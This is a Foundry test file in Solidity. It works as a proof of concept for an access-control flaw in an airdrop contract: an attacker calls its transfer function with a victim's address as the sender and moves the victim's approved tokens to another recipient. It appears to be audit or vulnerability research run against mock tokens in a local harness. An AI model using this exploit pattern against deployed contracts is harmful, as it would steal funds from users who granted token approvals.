// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xe894d54dca59cb53fe9cbc5155093605c7068220.sol";

contract UnauthorizedTransferTest is Test {
    // Vulnerable contract
    airDrop drop;
    
    // Mock token contract
    MockERC20 token;
    
    // Test addresses
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");
    address recipient = makeAddr("recipient");
    
    function setUp() public {
        // Deploy mock token
        token = new MockERC20();
        
        // Deploy vulnerable contract
        drop = new airDrop();
        
        // Victim holds tokens (1 token with 18 decimals)
        token.mint(victim, 1e18);
        
        // Victim approves airdrop contract to spend their tokens
        vm.prank(victim);
        token.approve(address(drop), 1e18);
    }

    function testUnauthorizedTransfer() public {
        // Create recipient array
        address[] memory recipients = new address[](1);
        recipients[0] = recipient;
        
        console.log("--- BEFORE-Trigger Transfer ---");
        uint256 victimBalanceBefore = token.balanceOf(victim);
        uint256 recipientBalanceBefore = token.balanceOf(recipient);
        uint256 totalTokensBefore = drop.totalTokensDistributed();
        uint256 dropCountBefore = drop.userDropCount(attacker);

        console.log("Victim balance before:    ", victimBalanceBefore);
        console.log("Recipient balance before: ", recipientBalanceBefore);
        console.log("Total tokens distributed: ", totalTokensBefore);
        console.log("Attacker drop count:      ", dropCountBefore);
        
        console.log("");
        console.log("--- Trigger Transfer ---");
        // Attacker initiates transfer from victim's address
        vm.prank(attacker);
        drop.transfer(
            victim,              // Unauthorized 'from' address
            address(token),      // Token address
            recipients,          // Recipients
            1,                   // Token amount (1 full token)
            18                   // Token decimals
        );
        
        console.log("");
        console.log("--- AFTER-Trigger Transfer ---");
        uint256 victimBalanceAfter = token.balanceOf(victim);
        uint256 recipientBalanceAfter = token.balanceOf(recipient);
        uint256 totalTokensAfter = drop.totalTokensDistributed();
        uint256 dropCountAfter = drop.userDropCount(attacker);

        console.log("Victim balance after:     ", victimBalanceAfter);
        console.log("Recipient balance after:  ", recipientBalanceAfter);
        console.log("Total tokens distributed: ", totalTokensAfter);
        console.log("Attacker drop count:      ", dropCountAfter);
        console.log("");
        
        // Calculate changes
        uint256 victimChange = victimBalanceBefore - victimBalanceAfter;
        uint256 recipientChange = recipientBalanceAfter - recipientBalanceBefore;
        uint256 tokensDistributedChange = totalTokensAfter - totalTokensBefore;
        uint256 dropCountChange = dropCountAfter - dropCountBefore;

        // Vulnerability verification
        bool fundsTransferred = victimChange == 1e18 && recipientChange == 1e18;
        bool stateAltered = dropCountChange > 0 || tokensDistributedChange > 0;

        console.log("Vulnerability verification:");
        console.log("Funds transferred:        %s", fundsTransferred ? "YES" : "NO");
        console.log("State altered:            %s", stateAltered ? "YES" : "NO");

        if (fundsTransferred) {
            console.log("Vulnerability Exists: Unauthorized transfer was successful");
        } else {
            console.log("Vulnerability not Exist: No unauthorized funds transfer occurred");
        }
    }
}

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
        require(balanceOf[from] >= amount, "Insufficient balance");
        
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        
        emit Transfer(from, to, amount);
        return true;
    }
}